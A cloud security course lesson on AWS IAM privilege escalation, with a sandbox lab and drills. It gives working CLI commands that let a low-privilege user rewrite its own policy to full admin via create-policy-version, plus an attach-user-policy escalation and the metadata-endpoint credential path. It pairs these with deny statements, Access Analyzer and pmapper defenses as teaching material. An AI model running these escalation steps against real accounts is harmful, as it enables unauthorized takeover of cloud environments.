# Day 14 — IAM Abuse & Privilege Escalation in AWS

## Objectives

By the end of today you should be able to:

- Enumerate an IAM principal's *actual* effective permissions from the inside, as a
  low-privilege user who cannot call `iam:GetAccountAuthorizationDetails` — the way
  `enumerate-iam`-style tooling does it, one narrow read call at a time.
- Name the three classic IAM privilege-escalation primitives — `iam:PassRole` +
  `ec2:RunInstances`, `iam:CreatePolicyVersion`, `iam:AttachUserPolicy` /
  `iam:PutUserPolicy` — and say precisely what each one lets a low-priv principal grant
  itself, and why none of them require ever guessing a password or a secret.
- Walk the exact `CreatePolicyVersion` escalation path end to end: spot a policy that
  can modify itself, rewrite its own document to `Effect: Allow, Action: *, Resource:
  *`, set that version as default, and hold administrator-equivalent access without a
  single new attachment ever being created.
- Write the one explicit **Deny** statement that closes that path — and explain why
  *explicit deny* is the only kind of statement in IAM's evaluation logic that no
  after-the-fact `Allow` anywhere else in the account can override.
- Describe what **IAM Access Analyzer** and **pmapper** each actually check, and which
  one of the two would have caught this lab's planted misconfiguration before it was
  ever exploited.

## 1. Concept — How IAM Privilege Escalation Actually Works

### Why IAM privesc doesn't look like "hacking"

Every attack from Day 5 onward (Linux privesc) had a recognizable shape: a
misconfigured SUID binary, a writable cron job, a kernel exploit. **IAM privilege
escalation in AWS has no equivalent visual signature.** There's no buffer to overflow
and no password to crack. The entire attack surface is: *which IAM API calls is this
low-priv principal allowed to make, and does any one of them let it change what it
itself is allowed to do?* If the answer is yes, the attacker never touches anything
outside IAM's own control plane — they simply use permissions that were granted
*legitimately*, in a combination nobody thought through. This is precisely why IAM
privesc paths are so often missed in manual policy review: each individual permission
looks small and reasonable in isolation (`iam:CreatePolicyVersion` sounds like a normal
policy-authoring action); the danger is only visible when you ask *which policy, and
who is it attached to right now?*

### The three classic primitives

There are more than a dozen documented IAM privesc paths (Rhino Security Labs'
research catalogued around 20+), but nearly all of them are variations on three ideas:

1. **`iam:PassRole` + `ec2:RunInstances` (or Lambda/`iam:PassRole` + a service that
   executes code with an attached role).** `iam:PassRole` lets a principal *hand a role
   to an AWS service* so that service can act as that role — this is how EC2 instance
   profiles, Lambda execution roles, and dozens of other AWS features work by design.
   The escalation: if a low-priv user has `iam:PassRole` (unrestricted, or scoped to a
   highly-privileged role) *and* `ec2:RunInstances`, they can launch an EC2 instance,
   attach an administrator-privileged role to it via its instance profile, then either
   SSH in or query the instance's metadata service (`169.254.169.254` — Day 15's topic)
   to pull that role's temporary credentials directly off the running instance. The
   user's own IAM identity never changes; they've simply borrowed a role's credentials
   through a service that was willing to hand them over.
2. **`iam:CreatePolicyVersion`.** Customer-managed IAM policies are versioned — up to
   five versions can exist for one policy at a time, and exactly one is the **default
   version**, i.e. the version that's actually enforced. `iam:CreatePolicyVersion`
   creates a *new* version of an existing policy's document; `--set-as-default` (or a
   separate `iam:SetDefaultPolicyVersion` call) makes that new version the one that's
   enforced. If a principal has `iam:CreatePolicyVersion` on a policy that happens to
   be attached to *themselves* (directly, or via a group they belong to), they can
   rewrite that policy's document to grant anything they want — `Action: *, Resource:
   *` included — and activate it, all without ever calling `iam:AttachUserPolicy` or
   `iam:PutUserPolicy`. This is today's lab.
3. **`iam:AttachUserPolicy` / `iam:PutUserPolicy` / `iam:AddUserToGroup` /
   `iam:CreateAccessKey` (for another user).** The most direct versions: if a low-priv
   user can attach an existing managed policy (e.g. `AdministratorAccess`) to
   themselves, add themselves to a privileged group, or mint a fresh access key for a
   *different*, more-privileged user, the escalation needs no cleverness at all — it's
   a single API call using a permission that should never have been granted to a
   non-admin principal in the first place.

All three primitives share the same underlying shape: **a principal was granted a
permission that lets it change its own effective permissions, or borrow someone else's,
without a second party in the loop.** The single question worth asking about *any*
IAM policy you write is: "does this action let the identity holding it change what
this identity — or something it can pass credentials to — is allowed to do?" If yes,
scope it tightly or don't grant it.

### Enumeration without `GetAccountAuthorizationDetails`

A real attacker who has landed low-priv credentials (a leaked access key, an SSRF into
the metadata service, a phished CLI profile) almost never has
`iam:GetAccountAuthorizationDetails` — the one call that would dump the entire IAM
policy landscape in one shot, since it's itself a highly privileged read. Enumeration
instead has to happen one narrow, individually-authorized call at a time:

- `sts:GetCallerIdentity` — free, unauthenticated-permission-wise (every principal can
  call it), and it's the first move: confirms exactly which account and which
  user/role ARN the current credentials belong to.
- `iam:GetUser`, `iam:ListAttachedUserPolicies`, `iam:ListUserPolicies`,
  `iam:ListGroupsForUser` — map what's directly and indirectly attached to *this*
  identity.
- `iam:GetPolicy`, `iam:GetPolicyVersion`, `iam:ListPolicyVersions` — for each attached
  managed policy, read its actual document and version history.
- `iam:SimulatePrincipalPolicy` — where available, ask IAM directly "would this
  identity be allowed to call action X on resource Y?" without ever making the real
  call — a low-noise way to probe permissions that don't show up in the policy
  document text alone (e.g. permissions granted through a group whose membership
  wasn't obvious).

This is exactly what the open-source **`enumerate-iam`** tool (Rhino Security Labs)
automates: it brute-forces roughly 100+ read-only / dry-run / simulate calls against
whatever credentials you hand it, and reports which ones succeeded — building a map of
real permissions from the outside, the same way today's Attack Lab does by hand with
five or six targeted calls instead of a hundred blind ones.

### Detecting privesc paths structurally: pmapper and Access Analyzer

Two tools attack this problem from opposite directions:

- **pmapper** (NCC Group's Principal Mapper) is built for the *defender's* side: given
  read access to an account's full IAM state (policies, users, roles, groups, and
  resource policies), it builds a directed graph of every principal and computes,
  offline, every path by which one principal could reach the permissions of another —
  including every one of the three primitives above, automatically, across an entire
  account, not just the one policy you happen to be staring at.
- **IAM Access Analyzer** answers a related but different question: for *unused
  access* — permissions granted but never exercised in the CloudTrail-observed window
  — and for *external access* — whether any resource-based policy (S3 bucket policy, a
  role's trust policy, etc.) grants access to a principal outside your account or
  organization. Its **unused-access findings** are the part relevant here: a policy
  granting `iam:CreatePolicyVersion` that's never actually been called is exactly the
  kind of standing, unexercised risk Access Analyzer is designed to surface — even
  though it doesn't reason about privesc *graphs* the way pmapper does.

Today's Defense Lab exercises both: the deny statement that structurally closes the
path, and naming precisely what each tool would (and wouldn't) have flagged about it.

## 2. Attack Lab — Enumerate as Low-Priv, Escalate via `CreatePolicyVersion`

**Authorized use only.** Everything below runs only against resources
`labs/day14/setup.sh` creates in **your own AWS sandbox account** — never against any
account, user, or policy you don't own or don't have explicit written authorization to
test. This lab uses a named AWS CLI profile throughout; no credential is ever written
into a script or committed to this repo. Full setup/teardown detail:
[`labs/day14/README.md`](../labs/day14/README.md).

### What `setup.sh` plants

Run once, from an admin-level profile in your sandbox account:

```sh
cd cyber_security/labs/day14
AWS_PROFILE=<your-admin-sandbox-profile> ./setup.sh
```

It creates:

- An IAM user, `day14-lowpriv`, with **no console access** — programmatic (access-key)
  credentials only, written to `labs/day14/output/day14-lowpriv-access-key.json`
  (gitignored — never commit this file).
- A managed policy, `day14-lowpriv-policy`, attached to `day14-lowpriv`, granting:
  - A handful of read-only calls (`sts:GetCallerIdentity`, `iam:GetUser`,
    `iam:ListAttachedUserPolicies`, `iam:GetPolicy`, `iam:GetPolicyVersion`,
    `iam:ListPolicyVersions`) — the enumeration surface, deliberately no broader than a
    real low-priv account would plausibly have.
  - **The planted misconfiguration:** `iam:CreatePolicyVersion` and
    `iam:SetDefaultPolicyVersion`, scoped by `Resource` to **the policy's own ARN** —
    `day14-lowpriv-policy` can rewrite and re-activate *itself*. This is a realistic
    mistake, not a contrived one: whoever wrote this policy scoped the dangerous
    actions to a single named resource, reasoning "this can't touch any *other*
    policy" — and never asked the one question that matters: *which identity is this
    policy attached to, and does that identity control this exact resource?*

Full policy JSON and exact CLI calls: [`labs/day14/setup.sh`](../labs/day14/setup.sh).

### Step 1 — Confirm identity and enumerate as the low-priv user

Configure a local profile from the generated access key (see the lab README), then:

```sh
aws sts get-caller-identity --profile day14-lowpriv
```

**What you should see:** the `day14-lowpriv` user's own ARN and account ID — confirming
which identity you're enumerating as, before anything else.

```sh
aws iam list-attached-user-policies --user-name day14-lowpriv --profile day14-lowpriv
```

**What you should see:** exactly one attached policy, `day14-lowpriv-policy`, with its
ARN. This is the enumeration surface an `enumerate-iam`-style sweep would find by
brute-forcing dozens of similar list/get calls; here it's one targeted call because you
already know your own username.

### Step 2 — Read the attached policy's actual document

```sh
POLICY_ARN=$(aws iam list-attached-user-policies --user-name day14-lowpriv \
  --profile day14-lowpriv --query 'AttachedPolicies[0].PolicyArn' --output text)

aws iam get-policy --policy-arn "$POLICY_ARN" --profile day14-lowpriv

aws iam get-policy-version --policy-arn "$POLICY_ARN" \
  --version-id "$(aws iam get-policy --policy-arn "$POLICY_ARN" --profile day14-lowpriv \
    --query 'Policy.DefaultVersionId' --output text)" \
  --profile day14-lowpriv
```

**What you should see:** the full JSON statement list, including
`iam:CreatePolicyVersion` and `iam:SetDefaultPolicyVersion` scoped by `Resource` to
`$POLICY_ARN` — this exact policy's own ARN. **This is the moment the escalation path
becomes visible**: the policy that grants this user their permissions is itself
modifiable by this user.

### Step 3 — Craft and push a new, self-granted admin policy version

```sh
cat > /tmp/day14-admin-version.json <<'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow", "Action": "*", "Resource": "*" }
  ]
}
EOF

aws iam create-policy-version \
  --policy-arn "$POLICY_ARN" \
  --policy-document file:///tmp/day14-admin-version.json \
  --set-as-default \
  --profile day14-lowpriv
```

**What you should see:** a successful `create-policy-version` response — the low-priv
user, using only the permissions it was already granted (`iam:CreatePolicyVersion` +
`iam:SetDefaultPolicyVersion` on this one policy ARN), just rewrote and activated a new
version of that policy granting itself unrestricted `Action: *, Resource: *`. No
`iam:AttachUserPolicy` call ever happened; the *existing* attachment to
`day14-lowpriv-policy` now means something completely different than it did a moment
ago.

### Step 4 — Confirm the escalation

```sh
aws iam list-users --profile day14-lowpriv
```

**What you should see:** this call — `iam:ListUsers` — was never granted anywhere in
the original policy and would have returned `AccessDenied` before Step 3. It now
succeeds, proving the escalation is real and not just a document change with no effect.
Full captured before/after and the exact JSON diff between policy versions:
[`labs/day14/SOLUTION.md`](../labs/day14/SOLUTION.md).

### Verify

The lab's verify command is documented rather than executed against a live account in
this write-up (per this lab's authorized-sandbox-only, learner-run model): run Steps
1–4 above in your own sandbox, in order, and confirm Step 4's `list-users` call
transitions from `AccessDenied` to a successful listing. Full expected output at each
step: `labs/day14/SOLUTION.md`.

## 3. Defense Lab — One Deny Statement, Access Analyzer, pmapper

### Defense 1 — The single explicit Deny that breaks the path

IAM's evaluation logic, precisely: **an explicit `Deny` anywhere in any policy that
applies to a request always wins**, regardless of how many `Allow` statements exist
elsewhere, including in policies created or modified *after* the deny was written. This
is what makes a permissions boundary (or a Deny placed directly on the user/group) the
correct fix here, rather than trying to enumerate and remove every possible future
`Allow` path: attach this as a permissions boundary (or an inline/managed policy) on
`day14-lowpriv`:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion"
      ],
      "Resource": "*"
    }
  ]
}
```

With this in place, re-running Step 3 exactly as written returns `AccessDenied` — not
because the original policy's `Allow` was removed (it wasn't; this is a *separate*
statement layered on top), but because IAM's evaluation logic checks for an applicable
explicit deny before it ever asks whether any allow exists. This is the general lesson,
not just today's specific fix: **the moment you spot a self-modifying-permission
primitive on any principal, the deny beats trying to reason about every allow that
principal has now or might gain later.**

### Defense 2 — What IAM Access Analyzer would flag

Enable IAM Access Analyzer (account or organization scope) and let it run its
**unused-access analyzer** against this account. Because the lab's low-priv user never
legitimately exercises `iam:CreatePolicyVersion` or `iam:SetDefaultPolicyVersion` as
part of its normal (intended) enumeration workflow, Access Analyzer's unused-permissions
findings would surface both actions on `day14-lowpriv-policy` as granted-but-unused —
a standing risk worth review, flagged *before* anyone ever exploits it, purely from
usage history. What Access Analyzer's **external-access** analyzer would *not* flag
here: this misconfiguration is entirely within-account (no cross-account or public
resource policy involved), so that half of Access Analyzer has nothing to say about it
— naming this boundary precisely matters, since assuming Access Analyzer catches
*every* IAM risk is itself a common, false sense of security.

### Defense 3 — What pmapper would flag

Running `pmapper graph create --profile <admin-sandbox-profile>` followed by
`pmapper analysis --profile <admin-sandbox-profile>` against this account would report
a **privilege-escalation edge** directly: `day14-lowpriv` → (via `CreatePolicyVersion`
on `day14-lowpriv-policy`) → effectively-admin, named as its own finding type rather
than left for a human to notice while reading a policy document by eye. This is the
precise advantage pmapper has over manual review or even Access Analyzer's
unused-access findings: it doesn't just report that a *permission* is unused or broad
— it computes the actual *reachability graph* and tells you which principal can become
which other principal, which is the exact question this lab's escalation answers.

### Boundary policies, named precisely

A **permissions boundary** is not a deny by itself — it's a *ceiling*: a separate
managed policy attached to a user or role that caps the maximum permissions that
identity's own policies can ever grant, no matter what those policies say. Applying a
boundary that excludes `iam:CreatePolicyVersion`/`iam:SetDefaultPolicyVersion` (and,
more broadly, all of `iam:*` except a narrow read-only allowlist) to every
non-administrator principal in an account is the durable, account-wide version of
Defense 1's single deny statement — Defense 1 fixes this one user; a boundary policy
applied at user-creation time prevents the *next* misconfigured policy from being
exploitable at all, which is exactly why Day 13's Concept section named `PassRole`
awareness and permission boundaries as the setup for today.

## 4. Drills

Attempt each drill yourself before reading its solution sketch.

### Drill 1 — Spot the escalation path in a different policy

A low-priv user `bob` has exactly this policy attached, and nothing else:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow", "Action": ["iam:GetUser", "iam:ListAttachedUserPolicies"], "Resource": "*" },
    { "Effect": "Allow", "Action": ["iam:AttachUserPolicy"], "Resource": "arn:aws:iam::123456789012:user/bob" }
  ]
}
```

Which primitive from Section 1 does `bob` have, and what's the single next API call
that escalates `bob` to administrator?

**Hint:** re-read primitive #3 in Section 1 — this policy doesn't need
`CreatePolicyVersion` at all; a much more direct action is scoped to `bob`'s own user
ARN.

**Solution sketch:** `bob` has `iam:AttachUserPolicy` scoped to himself — the most
direct of the three primitives. The escalation is one call:

```sh
aws iam attach-user-policy --user-name bob \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

No policy-document editing needed at all — `bob` simply attaches AWS's own managed
`AdministratorAccess` policy to himself, because nothing stops a principal with
`iam:AttachUserPolicy` on its own ARN from attaching *any* policy, including the most
powerful one that exists.

### Drill 2 — Write the deny statement that breaks Drill 1's path

Given `bob`'s policy above, write the one statement that closes this specific
escalation without removing `bob`'s existing (intended) `GetUser` /
`ListAttachedUserPolicies` read access.

**Hint:** deny the exact action Drill 1's escalation depended on, scoped broadly
enough that it can't be routed around by attaching a *different* self-referential
statement later.

**Solution sketch:**

```json
{
  "Effect": "Deny",
  "Action": ["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:DetachUserPolicy"],
  "Resource": "*"
}
```

A `Resource: "*"` deny on `AttachUserPolicy` (and its close siblings `PutUserPolicy`,
`DetachUserPolicy`, to prevent `bob` from detaching a restrictive policy just as
easily as attaching a permissive one) removes the primitive entirely, regardless of
which specific policy ARN a future `Allow` might try to scope it to — this is broader
and more durable than denying only the exact ARN combination seen in Drill 1's
statement.

### Drill 3 — What would Access Analyzer flag for Drill 1's policy?

Would IAM Access Analyzer's unused-access analyzer flag `bob`'s
`iam:AttachUserPolicy` statement as a risk, assuming `bob` has genuinely never called
it? Would its external-access analyzer flag anything?

**Hint:** re-read Defense 2 — the two analyzers answer different questions, and this
scenario, like the lab's, is entirely within-account.

**Solution sketch:** yes for unused-access — if CloudTrail shows `bob` has never
exercised `iam:AttachUserPolicy` in the observed window, Access Analyzer's
unused-permissions finding would list it as a standing, unexercised grant worth
review, exactly as it would for the lab's `CreatePolicyVersion` grant. No for
external-access — this is a within-account identity-policy risk with no cross-account
or public resource-policy component, which is outside what that analyzer evaluates.

### Drill 4 — `PassRole` + `RunInstances`, reasoned through conceptually

A low-priv user has `iam:PassRole` (unrestricted `Resource: "*"`, no
`iam:PassedToService` condition) and `ec2:RunInstances`. Explain, in two or three
sentences, exactly how this user reaches administrator-equivalent access, without
running any command — this is a conceptual drill, matching primitive #1 from Section 1
which today's lab doesn't execute live.

**Hint:** name what an EC2 instance profile actually is, and what's reachable from
inside a running instance at `169.254.169.254` (previewed here; Day 15's full topic).

**Solution sketch:** the user launches a new EC2 instance via `ec2:RunInstances`,
attaching an instance profile for an existing highly-privileged role (e.g. one with
`AdministratorAccess`) — `iam:PassRole` is exactly the permission that authorizes
"hand this role to this EC2 instance" and, being unrestricted here, doesn't stop them
from picking the most powerful role in the account. Once the instance is running, the
attacker reaches it (SSH, SSM, or any remote code execution path) and queries its
instance metadata service at `169.254.169.254/latest/meta-data/iam/security-credentials/
<role-name>`, which hands back that role's live, temporary AWS credentials — no
password, no secret-cracking, just a service that was designed to hand credentials to
whatever's running on the instance it's attached to.

## 5. Journal Prompt

Open `journal.md` and write today's entry using the template at the top of that file:

- **What I attacked:** name the exact planted misconfiguration (which action, scoped to
  which resource) and the exact policy-version diff you pushed to escalate — versus
  which primitive (`PassRole`+`RunInstances`, Drill 4) you only reasoned through
  conceptually today.
- **How:** walk through the enumeration calls you ran before you spotted the escalation
  path — which specific call (`get-policy-version`, most likely) was the moment it
  became visible that this policy could modify itself?
- **What defended it:** which of the three defenses (explicit deny, Access Analyzer,
  pmapper) did you actually reason through with a concrete before/after, and which did
  you only describe conceptually?
- **What confused me:** anything about why an explicit deny beats every allow, or why
  Access Analyzer's two analyzer types cover different halves of the risk, that didn't
  click on first pass.
- **One thing to revisit:** pick one term from today (IAM privesc, `PassRole`, policy
  version, permissions boundary, Access Analyzer, pmapper) to re-explain from memory
  before Day 15, without looking back at this file.
